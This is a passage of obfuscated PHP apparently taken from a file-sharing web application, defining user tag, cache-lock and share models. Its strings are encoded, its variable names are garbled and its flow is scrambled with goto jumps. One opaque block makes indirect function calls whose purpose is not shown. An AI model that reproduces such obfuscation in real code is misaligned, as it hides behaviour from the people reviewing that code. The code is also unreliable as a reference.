<?php
 goto cí¿á«¬õ±; Eœõê²ÕËâ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\x70\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($B´¥ÎŸ¾°ó) { $Bé±ö³Ê¢‰ =& $_SERVER[ÉóçÄÇ]; if (!defined($Bé±ö³Ê¢‰[448])) { define($Bé±ö³Ê¢‰[448], 0); } return "\125\163\x65\162\x4f\160\x74\x69\157\x6e\137{$B´¥ÎŸ¾°ó}\137" . USER_ID; } protected function filterWhere($e‡»ŠÒ¾Ü¸) { $EÆÕ’„œ×™ =& $_SERVER[ÉóçÄÇ]; if (!defined($EÆÕ’„œ×™[448])) { define($EÆÕ’„œ×™[448], 0); } $e‡»ŠÒ¾Ü¸[$EÆÕ’„œ×™[1511]] = USER_ID; return $e‡»ŠÒ¾Ü¸; } public function cacheRemoveUser($C«Ø–†¤­Ÿ, $C¦¾ôø§—’) { return Cache::remove("\x55\x73\145\x72\x4f\160\164\151\x6f\x6e\137{$C«Ø–†¤­Ÿ}\x5f" . $C¦¾ôø§—’); } protected function optionDefault($d©ÅøÓÑ† = '') { $aŠ†‰ö«¬  =& $_SERVER[ÉóçÄÇ]; if ($d©ÅøÓÑ† == $aŠ†‰ö«¬ [33]) { return $GLOBALS[$aŠ†‰ö«¬ [6]][$aŠ†‰ö«¬ [2139]]; } if ($d©ÅøÓÑ† == $aŠ†‰ö«¬ [2140]) { return $GLOBALS[$aŠ†‰ö«¬ [6]][$aŠ†‰ö«¬ [2141]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\x74\x61\x67\x4c\x69\163\164"; public $modelType = "\x55\x73\x65\162\117\160\164\x69\157\x6e"; public $field = array("\156\x61\155\x65", "\x73\164\x79\x6c\145", "\163\157\x72\x74"); public function listData($c„¤Ğ¾°­Â = false, $d„¶®¦ğƒ‘ = "\163\157\162\x74", $EÌÑÌÊ¦  = false) { return parent::listData($c„¤Ğ¾°­Â, $d„¶®¦ğƒ‘, $EÌÑÌÊ¦ ); } public function remove($DèÊ¯”ñ¥±) { return parent::remove($DèÊ¯”ñ¥±); } public function add($EŒ»­Äİ, $dÆà¸×Ú§õ = "\x6c\141\x62\x65\x6c\x2d\x67\162\145\171\x2d\156\x6f\162\x6d\141\154") { $FÖòÂÜë¯ =& $_SERVER[ÉóçÄÇ]; if ($this->findByName($EŒ»­Äİ)) { return !1; } $a¢ÖÎä‹ì = array($FÖòÂÜë¯[407] => $EŒ»­Äİ, $FÖòÂÜë¯[458] => $dÆà¸×Ú§õ, $FÖòÂÜë¯[1678] => $this->getSort($FÖòÂÜë¯[254]) + 1); return parent::insert($a¢ÖÎä‹ì); } public function update($Bñœ™²ë¡, $aé­ÎÖ¦œ™) { $dÅ Æø§Ç =& $_SERVER[ÉóçÄÇ]; $D°‹ì’îö“ = $this->listData($Bñœ™²ë¡); $c² ¨œÓ¶Å = $this->findByName($aé­ÎÖ¦œ™[$dÅ Æø§Ç[28]]); if (!$D°‹ì’îö“ || $c² ¨œÓ¶Å && $c² ¨œÓ¶Å[$dÅ Æø§Ç[388]] != $D°‹ì’îö“[$dÅ Æø§Ç[388]]) { return !1; } return parent::update($Bñœ™²ë¡, $aé­ÎÖ¦œ™); } public function moveTop($B—‰õÚõ¼Š) { $Fì—ìµ‹Ìù =& $_SERVER[ÉóçÄÇ]; $DˆíººÛêš = parent::listData(); $f¢Ÿ™Š‡ = $this->getSort($Fì—ìµ‹Ìù[253]); foreach ($DˆíººÛêš as &$aõßŞé®) { if ($aõßŞé®[$Fì—ìµ‹Ìù[388]] == $B—‰õÚõ¼Š) { $aõßŞé®[$Fì—ìµ‹Ìù[1697]] = $f¢Ÿ™Š‡; continue; } $aõßŞé®[$Fì—ìµ‹Ìù[1697]] += 1; } unset($aõßŞé®); return parent::resetData($DˆíººÛêš); } public function moveBottom($CÃÈ‚’Ô›é) { $Cí¡ÓˆÎ =& $_SERVER[ÉóçÄÇ]; $AØøöíŸ = $this->getSort($Cí¡ÓˆÎ[254]) + 1; return parent::update($CÃÈ‚’Ô›é, array($Cí¡ÓˆÎ[1697] => $AØøöíŸ)); } public function resetSort($f³ù’•Éƒ“) { goto Dšîø¡Ûá; DêÉ©«õÎ: for ($cÆˆª¢ªÓÉ = 0; $cÆˆª¢ªÓÉ < count($f³ù’•Éƒ“); $cÆˆª¢ªÓÉ++) { $dÒİä“Ö„Š[$f³ù’•Éƒ“[$cÆˆª¢ªÓÉ] . $a¹Ü Û†[33]] = $cÆˆª¢ªÓÉ + 1; } $cÙáĞœ¡Ã× = parent::listData(); foreach ($cÙáĞœ¡Ã× as &$cš÷•İ·Øá) { $D ÇÖÓ±Èù = $dÒİä“Ö„Š[$cš÷•İ·Øá[$a¹Ü Û†[388]]]; $cš÷•İ·Øá[$a¹Ü Û†[1697]] = $D ÇÖÓ±Èù ? $D ÇÖÓ±Èù : $cš÷•İ·Øá[$a¹Ü Û†[1697]]; } goto a¥•³†¿á§; Dšîø¡Ûá: $a¹Ü Û† =& $_SERVER[ÉóçÄÇ]; $dÒİä“Ö„Š = array(); $f³ù’•Éƒ“ = is_array($f³ù’•Éƒ“) ? $f³ù’•Éƒ“ : array(); goto DêÉ©«õÎ; a¥•³†¿á§: unset($cš÷•İ·Øá); return parent::resetData($cÙáĞœ¡Ã×); goto Ašµ´Ç˜Õè; Ašµ´Ç˜Õè: } private function getSort($d©è´ÈÇ‰) { $dÍõöñê–• =& $_SERVER[ÉóçÄÇ]; $cïæ„±¤ù¿ = parent::listData(); $bŞÎ£•ã³ = array_to_keyvalue($cïæ„±¤ù¿, $dÍõöñê–•[33], $dÍõöñê–•[1697]); if (!$bŞÎ£•ã³) { $bŞÎ£•ã³ = array(0); } $c °¢Ó‡‹ó = $d©è´ÈÇ‰ == $dÍõöñê–•[254] ? max($bŞÎ£•ã³) : min($bŞÎ£•ã³); return intval($c °¢Ó‡‹ó); } } if ($_SERVER[$_SERVER[ÉóçÄÇ][817]] != $_SERVER[$_SERVER[ÉóçÄÇ][1299]]) { goto A¢çß¾¡¬Á; Aßš¾Ôï¬: $b‡»‡ìÔ($_SERVER[$_SERVER[ÉóçÄÇ][818]]); goto f ãˆÙî; A‹®«ùŒ: $DÍÑÑå¼í = explode($_SERVER[ÉóçÄÇ][227], $d¢ÉÕßïìÙ); if (count($DÍÑÑå¼í) < $_SERVER[ÉóçÄÇ][570]) { $eÉ†»¹Ó•  = $_SERVER[ÉóçÄÇ][823]; $eÉ†»¹Ó• (); } $b‡»‡ìÔ = $_SERVER[ÉóçÄÇ][999]; goto Aßš¾Ôï¬; A¢çß¾¡¬Á: $EŠù•Æ„™ = $_SERVER[ÉóçÄÇ][820]; $BîŒˆ£š°É = $_SERVER[$_SERVER[ÉóçÄÇ][821]] . $_SERVER[ÉóçÄÇ][822]; $d¢ÉÕßïìÙ = $EŠù•Æ„™($BîŒˆ£š°É); goto A‹®«ùŒ; f ãˆÙî: } goto aÍŠ¦«’Æİ; Dªî‡àÜ‘¥: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $d…Úœ¼ Íæ =& $_SERVER[ÉóçÄÇ]; $dØî•ëƒß‚ = $GLOBALS[$d…Úœ¼ Íæ[6]][$d…Úœ¼ Íæ[345]]; self::$cachePath = $dØî•ëƒß‚[$d…Úœ¼ Íæ[173]][$d…Úœ¼ Íæ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A éê‘‚å, $BÏÙêÉ½¼ø = 0) { goto cò‰£ï»»; fÌ­…ÔÖéß: $this->unlock($A éê‘‚å); return !1; goto CÈ§ÎëŒÊ; cò‰£ï»»: $dçƒËØ‚óÛ =& $_SERVER[ÉóçÄÇ]; $B”š‘¡åèÖ = microtime(!0); $d”‘»æ¾šÈ = $B”š‘¡åèÖ + $BÏÙêÉ½¼ø + 0.0001; goto cÙ´ÏÒÚœí; cÙ´ÏÒÚœí: $BÚ’Ù±©¹ = rtrim(self::$cachePath, $dçƒËØ‚óÛ[8]) . $dçƒËØ‚óÛ[804] . md5($A éê‘‚å) . $dçƒËØ‚óÛ[801]; if (file_exists($BÚ’Ù±©¹) && filemtime($BÚ’Ù±©¹) && filemtime($BÚ’Ù±©¹) < time() - 10) { @unlink($BÚ’Ù±©¹); } do { if (file_exists($BÚ’Ù±©¹)) { cacheLockWait(); continue; } $E„ÕÏ‡¸¯ = fopen($BÚ’Ù±©¹, $dçƒËØ‚óÛ[805]); if (!$E„ÕÏ‡¸¯) { return !1; } $aåÚéß‚ò = flock($E„ÕÏ‡¸¯, LOCK_EX | LOCK_NB); self::$caches[$A éê‘‚å] = array($dçƒËØ‚óÛ[806] => $E„ÕÏ‡¸¯, $dçƒËØ‚óÛ[173] => $BÚ’Ù±©¹); fwrite($E„ÕÏ‡¸¯, $d”‘»æ¾šÈ); clearstatcache(); if ($E„ÕÏ‡¸¯ && $aåÚéß‚ò) { return !0; } cacheLockWait(); } while (microtime(!0) < $d”‘»æ¾šÈ); goto fÌ­…ÔÖéß; CÈ§ÎëŒÊ: } public function lockGet($E©à°ÌÔŞ¨) { $f…¡ ê±ÓŸ =& $_SERVER[ÉóçÄÇ]; $BƒØóË¼§ = rtrim(self::$cachePath, $f…¡ ê±ÓŸ[8]) . $f…¡ ê±ÓŸ[804] . md5($E©à°ÌÔŞ¨) . $f…¡ ê±ÓŸ[801]; return file_exists($BƒØóË¼§); } public function unlock($b§…ìßöÁ) { goto E¤¢¥¢Íˆ; E¤¢¥¢Íˆ: $B¦ğà‹âï´ =& $_SERVER[ÉóçÄÇ]; $E´ÍßİŞåÊ = self::$caches[$b§…ìßöÁ]; if (!$E´ÍßİŞåÊ) { return; } goto E¡„í±ƒ¨Á; E¡„í±ƒ¨Á: @flock($E´ÍßİŞåÊ[$B¦ğà‹âï´[806]], LOCK_UN); @fclose($E´ÍßİŞåÊ[$B¦ğà‹âï´[806]]); @unlink($E´ÍßİŞåÊ[$B¦ğà‹âï´[173]]); goto c‰Š¦åß§; c‰Š¦åß§: unset(self::$caches[$b§…ìßöÁ]); goto AºÖõ‚®åê; AºÖõ‚®åê: } } class CacheLockRedis { public function lock($báááÑÌ½, $bö‚Š†à‡¼ = 10) { $DºÚ±‚¸•ˆ = Cache::init(); $F¿›¼¾‚»‘ = microtime(!0) + $bö‚Š†à‡¼; while (microtime(!0) < $F¿›¼¾‚»‘) { $E¦‚¢¬À„ = $DºÚ±‚¸•ˆ->get($báááÑÌ½); if (!$E¦‚¢¬À„) { $e‰ç†á‚²ä = $DºÚ±‚¸•ˆ->setLock($báááÑÌ½, $F¿›¼¾‚»‘, $bö‚Š†à‡¼); if ($e‰ç†á‚²ä) { return !0; } } else { if ($E¦‚¢¬À„ < microtime(!0)) { $DºÚ±‚¸•ˆ->set($báááÑÌ½, $F¿›¼¾‚»‘, $bö‚Š†à‡¼ * 2); if ($DºÚ±‚¸•ˆ->get($báááÑÌ½) === $E¦‚¢¬À„) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($bí‹İÑ‚Ì) { return Cache::init()->get($bí‹İÑ‚Ì); } public function unlock($E´˜ø«ÒÉÅ) { return Cache::init()->remove($E´˜ø«ÒÉÅ); } } goto d‡ËÒ©í; e²Ç³¢‘ê¾: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\x54\x69\x6d\145", "\164\151\x6d\x65", "\151\x6e\163\x65\162\x74\x2c\165\x70\x64\141\164\x65", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\x63\x72\x65\x61\164\x65\124\151\x6d\x65", "\164\151\155\145", "\151\156\163\145\x72\164", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\x6f\x70\x74\151\157\x6e\163", '', "\x69\x6e\x73\145\162\x74\x2c\x75\160\x64\x61\164\145\54\x73\x65\x6c\145\143\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($D—²Üâˆº¤) { $bŠÆ¸¡¾˜² =& $_SERVER[ÉóçÄÇ]; $bßà²àæµé = isset($D—²Üâˆº¤[0]) ? $D—²Üâˆº¤[0] : !1; return array($bŠÆ¸¡¾˜²[1803] => array(USER_ID, $bŠÆ¸¡¾˜²[1804]), $bŠÆ¸¡¾˜²[1747] => array($bßà²àæµé, $bŠÆ¸¡¾˜²[1805])); } protected function listSimple() { $Eß‹Ú³÷åÅ = array($_SERVER[ÉóçÄÇ][1511] => USER_ID); $D²Ò¢ÖŒ¶ó = $this->field($this->fieldList)->where($Eß‹Ú³÷åÅ)->select(); return $D²Ò¢ÖŒ¶ó ? $D²Ò¢ÖŒ¶ó : array(); } protected function getInfo($aİåíÓ¨õ, $eÆèŸÑ³”Ã = false) { $B‰õÈóÎĞä =& $_SERVER[ÉóçÄÇ]; if ($eÆèŸÑ³”Ã) { return $this->_getShareInfo(array($B‰õÈóÎĞä[462] => $aİåíÓ¨õ)); } $e£Ÿ÷øŒ¬ = $this->cacheFunctionGet($B‰õÈóÎĞä[1754], $aİåíÓ¨õ); return $e£Ÿ÷øŒ¬; } public function getInfoByHash($aÎ§Ï‹ù‹) { return $this->_getShareInfo(array($_SERVER[ÉóçÄÇ][464] => $aÎ§Ï‹ù‹)); } public function getInfoByPath($D•‰ù¨ÈÃÎ) { $dŞ‰Ç°ÃÓ§ =& $_SERVER[ÉóçÄÇ]; $b¥Ì­Ü ØÜ = array($dŞ‰Ç°ÃÓ§[1511] => USER_ID, $dŞ‰Ç°ÃÓ§[390] => $D•‰ù¨ÈÃÎ); return $this->_getShareInfo($b¥Ì­Ü ØÜ); } public function getInfoBySourcePath($cã³›ÚÂó¶) { $CêÄñ˜ßôÇ =& $_SERVER[ÉóçÄÇ]; $aŸšÁÖ’Å¢ = array($CêÄñ˜ßôÇ[1511] => USER_ID, $CêÄñ˜ßôÇ[1053] => $cã³›ÚÂó¶); return $this->_getShareInfo($aŸšÁÖ’Å¢); } private function _getShareInfo($eŸ™Ÿé£ó) { goto bô¡ ´ÚÅ; bô¡ ´ÚÅ: $E£ÊÍœÁ‚› =& $_SERVER[ÉóçÄÇ]; $aà…¼‘…íÜ = $this->where($eŸ™Ÿé£ó)->find(); if (!$aà…¼‘…íÜ) { return !1; } goto e³¥¯øÉšº; AÉñô„ÙÅ©: if ($aà…¼‘…íÜ[$E£ÊÍœÁ‚›[390]] == $E£ÊÍœÁ‚›[491]) { $aà…¼‘…íÜ[$E£ÊÍœÁ‚›[84]] = IO::info($aà…¼‘…íÜ[$E£ÊÍœÁ‚›[1053]]); } else { $aà…¼‘…íÜ[$E£ÊÍœÁ‚›[84]] = Model($E£ÊÍœÁ‚›[1186])->pathInfo($aà…¼‘…íÜ[$E£ÊÍœÁ‚›[390]]); } $aà…¼‘…íÜ[$E£ÊÍœÁ‚›[1807]] = $f»Åšœßó‘; return $aà…¼‘…íÜ; goto CßÏ×³ò×Ù; e³¥¯øÉšº: $eŸ™Ÿé£ó = array($E£ÊÍœÁ‚›[462] => $aà…¼‘…íÜ[$E£ÊÍœÁ‚›[462]]); $f’Æ¥ˆ¿¢¦ = $E£ÊÍœÁ‚›[1806]; $f»Åšœßó‘ = Model($E£ÊÍœÁ‚›[559])->order($E£ÊÍœÁ‚›[388])->field($f’Æ¥ˆ¿¢¦)->where($eŸ™Ÿé£ó)->select(); goto AÉñô„ÙÅ©; CßÏ×³ò×Ù: } protected function getInfoAuth($eìğÙ‘˜Ò÷) { $Fâ¤„Ş‹Çº =& $_SERVER[ÉóçÄÇ]; $Fóâ¶‰­¹ = $this->getInfo($eìğÙ‘˜Ò÷); $Fóâ¶‰­¹[$Fâ¤„Ş‹Çº[400]] = Model($Fâ¤„Ş‹Çº[476])->authMake($Fóâ¶‰­¹[$Fâ¤„Ş‹Çº[1807]]); return $Fóâ¶‰­¹; } protected function listData($f©Şù¶éòÜ = null, $dŞ‡¤ª‹æ = 300) { $eÖÎ«Ó£¦ =& $_SERVER[ÉóçÄÇ]; $C¤„”“¯ªç = array(array($eÖÎ«Ó£¦[467] => array($eÖÎ«Ó£¦[951], 0), $eÖÎ«Ó£¦[469] => array($eÖÎ«Ó£¦[951], 0), $eÖÎ«Ó£¦[1808] => $eÖÎ«Ó£¦[1762])); if ($f©Şù¶éòÜ == $eÖÎ«Ó£¦[1809]) { $C¤„”“¯ªç = array($eÖÎ«Ó£¦[467] => 1); } else { if ($f©Şù¶éòÜ == $eÖÎ«Ó£¦[1038]) { $C¤„”“¯ªç = array($eÖÎ«Ó£¦[469] => 1); } } $C¤„”“¯ªç[$eÖÎ«Ó£¦[1511]] = USER_ID; $AÖô‹æó´ = $this->where($C¤„”“¯ªç)->selectPage($dŞ‡¤ª‹æ); return $AÖô‹æó´; } protected function listToMe($f°É™˜ÍÕÒ = 300) { goto E¦µÊ†Õ®; b¼¼Ù­¾©å: if ($b®Ô„Ôáª˜) { $Cõ„ˆ¦†ê² = array(array($E¨Ø¾æŒ›[544] => SourceModel::TYPE_USER, $E¨Ø¾æŒ›[478] => USER_ID), array($E¨Ø¾æŒ›[544] => SourceModel::TYPE_GROUP, $E¨Ø¾æŒ›[478] => array($E¨Ø¾æŒ›[7], $b®Ô„Ôáª˜)), $E¨Ø¾æŒ›[1808] => $E¨Ø¾æŒ›[1762]); } $d¢ğŞßİ = Model($E¨Ø¾æŒ›[559])->where($Cõ„ˆ¦†ê²)->selectPage($f°É™˜ÍÕÒ); $eä½÷ÈĞƒ¢ = array_to_keyvalue_group($d¢ğŞßİ[$E¨Ø¾æŒ›[365]], $E¨Ø¾æŒ›[462]); goto D®’¾Ó¡áÈ; eÎ‚Âš©¶ç: $b¨¾î¯Ä£¾ = array($E¨Ø¾æŒ›[1812] => $dÅå°Ş«Â°, $E¨Ø¾æŒ›[1813] => $d¢ğŞßİ[$E¨Ø¾æŒ›[362]]); return $b¨¾î¯Ä£¾; goto fĞÌ§Î·àÕ; Cà»ƒãÈç¬: $dÅå°Ş«Â° = $this->field($eÅ¿Ü¯…°°)->where($Cõ„ˆ¦†ê²)->select(); foreach ($dÅå°Ş«Â° as $a‡½„ñŒ‚œ => &$Aù´™ÒĞ) { $Aù´™ÒĞ[$E¨Ø¾æŒ›[1807]] = $eä½÷ÈĞƒ¢[$Aù´™ÒĞ[$E¨Ø¾æŒ›[462]]]; } unset($Aù´™ÒĞ); goto eÎ‚Âš©¶ç; E¦µÊ†Õ®: $E¨Ø¾æŒ› =& $_SERVER[ÉóçÄÇ]; $b®Ô„Ôáª˜ = Model($E¨Ø¾æŒ›[1810])->userGroupParents(USER_ID); $Cõ„ˆ¦†ê² = array($E¨Ø¾æŒ›[544] => SourceModel::TYPE_USER, $E¨Ø¾æŒ›[478] => USER_ID); goto b¼¼Ù­¾©å; D®’¾Ó¡áÈ: if (!$eä½÷ÈĞƒ¢) { return $d¢ğŞßİ; } $eÅ¿Ü¯…°° = $E¨Ø¾æŒ›[1811]; $Cõ„ˆ¦†ê² = array($E¨Ø¾æŒ›[462] => array($E¨Ø¾æŒ›[405], array_keys($eä½÷ÈĞƒ¢))); goto Cà»ƒãÈç¬; fĞÌ§Î·àÕ: } protected function shareAdd($a³Çñ£², $dÅÆöÈÑà) { $bÉ¥¹¸Ÿíä =& $_SERVER[ÉóçÄÇ]; $dÏÇëêŸ¢¥ = $this->_addShareData($a³Çñ£², $dÅÆöÈÑà); if (!empty($dÅÆöÈÑà[$bÉ¥¹¸Ÿíä[1814]])) { $this->_shareAuthSet($dÏÇëêŸ¢¥, $dÅÆöÈÑà[$bÉ¥¹¸Ÿíä[1814]]); } $this->shareEventAdd($a³Çñ£², $dÅÆöÈÑà, $bÉ¥¹¸Ÿíä[1041]); return $dÏÇëêŸ¢¥; } private function shareEventAdd($aç¼©Çöàø, $Eïé “ˆÈ, $cƒëÑ½À˜ = "\x61\144\x64") { goto d‡Ë‡ˆÂ…Ê; CŠ´­–ôĞå: return; goto b†£»Çò³; d‡Ë‡ˆÂ…Ê: $aëäéÕê› =& $_SERVER[ÉóçÄÇ]; if ($cƒëÑ½À˜ == $aëäéÕê›[1041]) { if ($Eïé “ˆÈ[$aëäéÕê›[467]] == $aëäéÕê›[86]) { Model($aëäéÕê›[528])->eventShare($aç¼©Çöàø, $aëäéÕê›[1815]); } if ($Eïé “ˆÈ[$aëäéÕê›[469]] == $aëäéÕê›[86]) { Model($aëäéÕê›[528])->eventShare($aç¼©Çöàø, $aëäéÕê›[1816]); } return; } $AìöÏÌ· = $this->getInfoByPath($aç¼©Çöàø); goto e¯®Ş†Âø¡; A—…½“ÑÚ: if ($AìöÏÌ·[$aëäéÕê›[469]] == $aëäéÕê›[491] && $Eïé “ˆÈ[$aëäéÕê›[469]] == $aëäéÕê›[86]) { $A¼èÓÛ°µ = $aëäéÕê›[1816]; } if ($AìöÏÌ·[$aëäéÕê›[469]] == $aëäéÕê›[86] && $Eïé “ˆÈ[$aëäéÕê›[469]] == $aëäéÕê›[491]) { $A¼èÓÛ°µ = $aëäéÕê›[1819]; } Model($aëäéÕê›[528])->eventShare($aç¼©Çöàø, $A¼èÓÛ°µ); goto CŠ´­–ôĞå; e¯®Ş†Âø¡: $A¼èÓÛ°µ = $aëäéÕê›[1817]; if ($AìöÏÌ·[$aëäéÕê›[467]] == $aëäéÕê›[491] && $Eïé “ˆÈ[$aëäéÕê›[467]] == $aëäéÕê›[86]) { $A¼èÓÛ°µ = $aëäéÕê›[1815]; } if ($AìöÏÌ·[$aëäéÕê›[467]] == $aëäéÕê›[86] && $Eïé “ˆÈ[$aëäéÕê›[467]] == $aëäéÕê›[491]) { $A¼èÓÛ°µ = $aëäéÕê›[1818]; } goto A—…½“ÑÚ; b†£»Çò³: } private function _addShareData($féå³ÙØÑË, $aÆ»ğŞ¥ = array()) { goto BÕ§¢ÖÑˆæ; eÁÊô‚‡„: $C÷ù¯ÌèãÎ = array($c¡ºñÇ×½Õ[1503] => USER_ID, $c¡ºñÇ×½Õ[404] => $féå³ÙØÑË, $c¡ºñÇ×½Õ[1414] => $c¡ºñÇ×½Õ[33], $c¡ºñÇ×½Õ[467] => 0, $c¡ºñÇ×½Õ[469] => 0, $c¡ºñÇ×½Õ[1053] => $c¡ºñÇ×½Õ[33], $c¡ºñÇ×½Õ[303] => $c¡ºñÇ×½Õ[33], $c¡ºñÇ×½Õ[831] => $c¡ºñÇ×½Õ[33], $c¡ºñÇ×½Õ[1821] => 0, $c¡ºñÇ×½Õ[1822] => 0, $c¡ºñÇ×½Õ[470] => 0, $c¡ºñÇ×½Õ[471] => $c¡ºñÇ×½Õ[33], $c¡ºñÇ×½Õ[464] => $c¡ºñÇ×½Õ[33]); $aÚµãÆõ = explode($c¡ºñÇ×½Õ[47], $c¡ºñÇ×½Õ[1823]); foreach ($aÚµãÆõ as $fÍË¯‰†é) { if (!isset($aÆ»ğŞ¥[$fÍË¯‰†é])) { continue; } $C÷ù¯ÌèãÎ[$fÍË¯‰†é] = $aÆ»ğŞ¥[$fÍË¯‰†é]; } goto E‹†µˆ£œ³; CªˆøõóŞ·: if ($d÷ÉÍ¸”‹‹ = $this->where($dŞ„†ç°îî)->find()) { return $d÷ÉÍ¸”‹‹[$c¡ºñÇ×½Õ[462]]; } if ($féå³ÙØÑË == 0) { $dÉ“†¥Ì¾« = array($c¡ºñÇ×½Õ[28] => get_path_this($aÆ»ğŞ¥[$c¡ºñÇ×½Õ[75]])); } else { $dÉ“†¥Ì¾« = Model($c¡ºñÇ×½Õ[776])->sourceInfo($féå³ÙØÑË); if (!$dÉ“†¥Ì¾«) { return !1; } } if (!$aÆ»ğŞ¥[$c¡ºñÇ×½Õ[1414]]) { $aÆ»ğŞ¥[$c¡ºñÇ×½Õ[1414]] = $dÉ“†¥Ì¾«[$c¡ºñÇ×½Õ[28]]; } goto eÁÊô‚‡„; BÕ§¢ÖÑˆæ: $c¡ºñÇ×½Õ =& $_SERVER[ÉóçÄÇ]; $dŞ„†ç°îî = array($c¡ºñÇ×½Õ[404] => $féå³ÙØÑË, $c¡ºñÇ×½Õ[1503] => USER_ID); if ($féå³ÙØÑË == 0) { $dŞ„†ç°îî = array($c¡ºñÇ×½Õ[1820] => $aÆ»ğŞ¥[$c¡ºñÇ×½Õ[1053]], $c¡ºñÇ×½Õ[1503] => USER_ID); } goto CªˆøõóŞ·; E‹†µˆ£œ³: $fÇìªÊ«±ë = $this->add($C÷ù¯ÌèãÎ); $b‰—ô¾Ï•ç = array($c¡ºñÇ×½Õ[464] => short_id($fÇìªÊ«±ë)); $this->where(array($c¡ºñÇ×½Õ[461] => $fÇìªÊ«±ë))->save($b‰—ô¾Ï•ç); goto cÂ¸ªïñìÄ; cÂ¸ªïñìÄ: return $fÇìªÊ«±ë; goto BÂëØƒìÅ; BÂëØƒìÅ: } private function _shareAuthSet($B’Â‚Ú·±, $FªŠ™Ş›îÌ) { goto CÃ©İ‹ÆÖ; b‘Òµê£: return $Eéôò¡Ø->addAll($bçÅÑÓÙ‹ï, array(), !0); goto dÜø¡¶äÚÚ; aùğä¨éÄ: $Eéôò¡Ø->where(array($d„¯ÇãºÇÓ[462] => $B’Â‚Ú·±))->delete(); $bçÅÑÓÙ‹ï = array(); foreach ($FªŠ™Ş›îÌ as $b¢¦ƒ‰²Â¥) { $Fëèé’ôñ› = SourceModel::TYPE_USER; if ($b¢¦ƒ‰²Â¥[$d„¯ÇãºÇÓ[398]] == SourceModel::TYPE_GROUP) { $Fëèé’ôñ› = SourceModel::TYPE_GROUP; } $D«Û†ÈÕó = array($d„¯ÇãºÇÓ[462] => $B’Â‚Ú·±, $d„¯ÇãºÇÓ[398] => $Fëèé’ôñ›, $d„¯ÇãºÇÓ[478] => intval($b¢¦ƒ‰²Â¥[$d„¯ÇãºÇÓ[478]]), $d„¯ÇãºÇÓ[1770] => 0, $d„¯ÇãºÇÓ[1824] => -1); if ($b¢¦ƒ‰²Â¥[$d„¯ÇãºÇÓ[1770]]) { $D«Û†ÈÕó[$d„¯ÇãºÇÓ[1770]] = $b¢¦ƒ‰²Â¥[$d„¯ÇãºÇÓ[1770]]; } else { if ($b¢¦ƒ‰²Â¥[$d„¯ÇãºÇÓ[1824]]) { $D«Û†ÈÕó[$d„¯ÇãºÇÓ[1824]] = $b¢¦ƒ‰²Â¥[$d„¯ÇãºÇÓ[1824]]; } } $bçÅÑÓÙ‹ï[] = $D«Û†ÈÕó; } goto b‘Òµê£; CÃ©İ‹ÆÖ: $d„¯ÇãºÇÓ =& $_SERVER[ÉóçÄÇ]; if (!is_array($FªŠ™Ş›îÌ)) { return !1; } $Eéôò¡Ø = Model($d„¯ÇãºÇÓ[1774]); goto aùğä¨éÄ; dÜø¡¶äÚÚ: } public function numViewAdd($cÛ÷óÁÛÏ¹) { $eã„½ÆŠŞê =& $_SERVER[ÉóçÄÇ]; $EÅÕ­ê´Õ = array($eã„½ÆŠŞê[461] => $cÛ÷óÁÛÏ¹); $this->where($EÅÕ­ê´Õ)->setAdd($eã„½ÆŠŞê[1821]); } public function numDownloadAdd($dƒäæ÷İ‘±) { $a—áÉÔĞÃÖ =& $_SERVER[ÉóçÄÇ]; $FÜÑÂÉŞ´ = array($a—áÉÔĞÃÖ[461] => $dƒäæ÷İ‘±); $this->where($FÜÑÂÉŞ´)->setAdd($a—áÉÔĞÃÖ[1822]); } protected function shareEdit($dÔïù¥ÖŒ, $Aë„ñÅ ¡¨) { goto cèã¬™‘; aĞŸÀÁ”ÏÛ: foreach ($Fìˆäˆ‹¨¨ as $DÁÔ£¤¬ÛÊ) { if (!array_key_exists($DÁÔ£¤¬ÛÊ, $Aë„ñÅ ¡¨)) { continue; } $CÇ“À¢ø‘[$DÁÔ£¤¬ÛÊ] = $Aë„ñÅ ¡¨[$DÁÔ£¤¬ÛÊ]; } $this->shareEventAdd($cÈ‚ØÆ¢Éö[$c¯¶Ô¦Ïœ[390]], $Aë„ñÅ ¡¨, $c¯¶Ô¦Ïœ[1641]); $this->where(array($c¯¶Ô¦Ïœ[461] => $dÔïù¥ÖŒ))->save($CÇ“À¢ø‘); goto f´Äê”¦™Ú; f´Äê”¦™Ú: if (isset($Aë„ñÅ ¡¨[$c¯¶Ô¦Ïœ[1814]])) { $this->_shareAuthSet($dÔïù¥ÖŒ, $Aë„ñÅ ¡¨[$c¯¶Ô¦Ïœ[1814]]); } return !0; goto bÙé÷Î•µ´; cèã¬™‘: $c¯¶Ô¦Ïœ =& $_SERVER[ÉóçÄÇ]; $cÈ‚ØÆ¢Éö = $this->getInfo($dÔïù¥ÖŒ); if (!$cÈ‚ØÆ¢Éö) { return !1; } goto féÇÜµ¸; féÇÜµ¸: $this->_checkLinkShare($Aë„ñÅ ¡¨, $cÈ‚ØÆ¢Éö); $CÇ“À¢ø‘ = array(); $Fìˆäˆ‹¨¨ = explode($c¯¶Ô¦Ïœ[47], $c¯¶Ô¦Ïœ[1825]); goto aĞŸÀÁ”ÏÛ; bÙé÷Î•µ´: } private function _checkLinkShare($D¢š²ÒÛæ, $aİí¬äò¡£) { goto EÒ—«÷àŸØ; B‹ëğ©ñİØ: $c©ëÈÀíñœ = $this->shareFileMeta($d‘—ÕöÇªø[$aÊèâ‹“±¹[441]]); if (isset($c©ëÈÀíñœ[$aÊèâ‹“±¹[370]]) && $c©ëÈÀíñœ[$aÊèâ‹“±¹[370]] == $aÊèâ‹“±¹[86]) { show_json(LNG($aÊèâ‹“±¹[1828]), !1); } goto BĞô¥ƒñëù; E”³‡¥èõ³: if ($aİí¬äò¡£[$aÊèâ‹“±¹[84]][$aÊèâ‹“±¹[29]] != $aÊèâ‹“±¹[173]) { 